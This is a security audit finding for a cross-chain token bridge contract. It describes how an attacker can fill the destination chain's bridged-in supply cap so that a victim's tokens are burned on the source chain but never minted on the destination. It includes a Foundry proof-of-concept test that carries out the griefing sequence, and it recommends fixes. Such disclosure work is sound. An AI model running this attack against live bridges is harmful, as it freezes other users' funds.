### Title
An attacker can strand bridged synthetic tokens by saturating the destination bridged-in cap - ([File: `contracts/ProxyOFT.sol`])

### Summary
`ProxyOFT.sendFrom()` burns synthetic tokens on the source chain before relying on a later LayerZero delivery to mint them on the destination chain. If the destination mint exceeds `maxBridgedInSupply`, the delivery is caught as a failed nonblocking message and no source-chain refund is issued. An unprivileged attacker can consume the remaining bridged-in capacity first, causing a later cross-chain transfer to remain mintable only after capacity is freed.

### Finding Description
`ProxyOFT.sendFrom()` calls `_send()`, which debits the sender before dispatching the LayerZero message. `_debitFrom()` verifies the sender, bridging status, and supported destination, then calls `syntheticToken.burn(from_, amount_)`. [1](#0-0) 

On the destination chain, `_sendAck()` decodes the packet and calls `_creditTo()`, which calls `syntheticToken.mint(toAddress_, amount_)`. [2](#0-1) [3](#0-2) 

A proxy-OFT mint increments `totalBridgedIn` and reverts with `SurpassMaxBridgingSupply` when `totalBridgedIn - totalBridgedOut` exceeds `maxBridgedInSupply`. [4](#0-3)  The corresponding source-chain burn increments `totalBridgedOut` and enforces the source-side bridged-out cap, but does not reserve destination capacity. [5](#0-4) 

The nonblocking LayerZero adapter catches the failed mint and stores only the message hash. [6](#0-5)  `retryMessage()` can execute it later, but it clears the stored hash first and reverts again while the destination cap remains saturated. [7](#0-6) 

### Impact Explanation
The victim’s tokens are burned on the source chain while no destination-chain balance is minted, temporarily breaking cross-chain supply conservation from the user’s perspective. The funds remain unavailable until enough destination bridged-in capacity is created by outbound burns or a cap increase.

An attacker who controls the remaining destination capacity can decide when the victim’s message becomes retryable by bridging their received tokens back out of the destination chain. This creates an unprivileged griefing vector that temporarily freezes the victim’s bridged funds.

### Likelihood Explanation
The attack does not require a malicious LayerZero endpoint, relayer, governor, or privileged role. The attacker can acquire or issue synthetic tokens, call the public `sendFrom()` path to consume the remaining `maxBridgedInSupply - bridgedInSupply()` capacity, and submit or front-run their source-chain transaction before the victim’s transfer.

The practical cost is bounded by the remaining destination bridged-in headroom plus issuance collateral and LayerZero fees, so likelihood is highest when a destination chain is already close to its configured cap.

### Recommendation
Add a source-chain refund path for failed destination credits, such as a reverse refund message that remits the burned amount to the original sender. Alternatively, escrow or otherwise reserve destination capacity before allowing the source burn, and make retries explicitly re-store the failed message when execution fails instead of leaving recovery dependent on another successful call.

### Proof of Concept
A Foundry multi-fork test can reproduce the issue using the existing LayerZero test pattern.

```solidity
function test_bridgeInCapSaturationStrandsVictim() public {
    uint16 srcChainId = LZ_MAINNET_CHAIN_ID;
    uint16 dstChainId = LZ_OP_CHAIN_ID;

    vm.selectFork(optimismFork);
    uint256 headroom =
        msUSD_optimism.maxBridgedInSupply() -
        msUSD_optimism.bridgedInSupply();

    // Attacker obtains enough msUSD on mainnet and consumes the
    // destination bridged-in headroom.
    vm.selectFork(mainnetFork);
    uint256 attackerFee = proxyOFT_msUSD_mainnet.estimateSendFee(
        dstChainId,
        attacker,
        headroom
    );

    vm.startPrank(attacker);
    deal(attacker, attackerFee);
    proxyOFT_msUSD_mainnet.sendFrom{value: attackerFee}(
        attacker,
        dstChainId,
        attacker,
        headroom
    );
    vm.stopPrank();

    bytes memory attackerTo = abi.encodePacked(attacker);
    bytes memory attackerSrcAddress = abi.encodePacked(
        address(proxyOFT_msUSD_mainnet),
        address(proxyOFT_msUSD_optimism)
    );

    vm.selectFork(optimismFork);
    vm.startPrank(lzEndpoint_optimism.defaultReceiveLibraryAddress());
    lzEndpoint_optimism.receivePayload({
        _srcChainId: srcChainId,
        _srcAddress: attackerSrcAddress,
        _dstAddress: address(proxyOFT_msUSD_optimism),
        _nonce: lzEndpoint_optimism.getInboundNonce(
            srcChainId,
            abi.encode(address(proxyOFT_msUSD_mainnet))
        ) + 1,
        _gasLimit: SIMPLE_TRANSFER_GAS,
        _payload: abi.encode(PT_SEND, attackerTo, headroom)
    });
    vm.stopPrank();

    assertEq(msUSD_optimism.bridgedInSupply(), msUSD_optimism.maxBridgedInSupply());

    // Victim sends any positive amount afterward.
    vm.selectFork(mainnetFork);
    uint256 victimAmount = 1 ether;
    uint256 victimFee = proxyOFT_msUSD_mainnet.estimateSendFee(
        dstChainId,
        victim,
        victimAmount
    );

    vm.startPrank(victim);
    deal(victim, victimFee);
    proxyOFT_msUSD_mainnet.sendFrom{value: victimFee}(
        victim,
        dstChainId,
        victim,
        victimAmount
    );
    vm.stopPrank();

    assertEq(msUSD_mainnet.balanceOf(victim), 0);

    bytes memory victimTo = abi.encodePacked(victim);
    bytes memory victimPayload = abi.encode(PT_SEND, victimTo, victimAmount);

    // Destination delivery catches the SurpassMaxBridgingSupply revert.
    vm.selectFork(optimismFork);
    uint64 victimNonce = lzEndpoint_optimism.getInboundNonce(
        srcChainId,
        abi.encode(address(proxyOFT_msUSD_mainnet))
    ) + 1;

    vm.startPrank(lzEndpoint_optimism.defaultReceiveLibraryAddress());
    lzEndpoint_optimism.receivePayload({
        _srcChainId: srcChainId,
        _srcAddress: attackerSrcAddress,
        _dstAddress: address(proxyOFT_msUSD_optimism),
        _nonce: victimNonce,
        _gasLimit: SIMPLE_TRANSFER_GAS,
        _payload: victimPayload
    });
    vm.stopPrank();

    // The victim has no source or destination balance.
    assertEq(msUSD_optimism.balanceOf(victim), 0);
    assertEq(
        proxyOFT_msUSD_optimism.failedMessages(
            srcChainId,
            attackerSrcAddress,
            victimNonce
        ),
        keccak256(victimPayload)
    );

    // Retrying while the cap remains saturated reverts again.
    vm.expectRevert(SurpassMaxBridgingSupply.selector);
    proxyOFT_msUSD_optimism.retryMessage(
        srcChainId,
        attackerSrcAddress,
        victimNonce,
        victimPayload
    );
}
```

    function retryMessage(uint16 _srcChainId, bytes calldata _srcAddress, uint64 _nonce, bytes calldata _payload) public payable virtual {
        // assert there is message to retry
        bytes32 payloadHash = failedMessages[_srcChainId][_srcAddress][_nonce];
        require(payloadHash != bytes32(0), "NonblockingLzApp: no stored message");
        require(keccak256(_payload) == payloadHash, "NonblockingLzApp: invalid payload");
        // clear the stored message
        failedMessages[_srcChainId][_srcAddress][_nonce] = bytes32(0);
        // execute the message. revert if it fails again
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
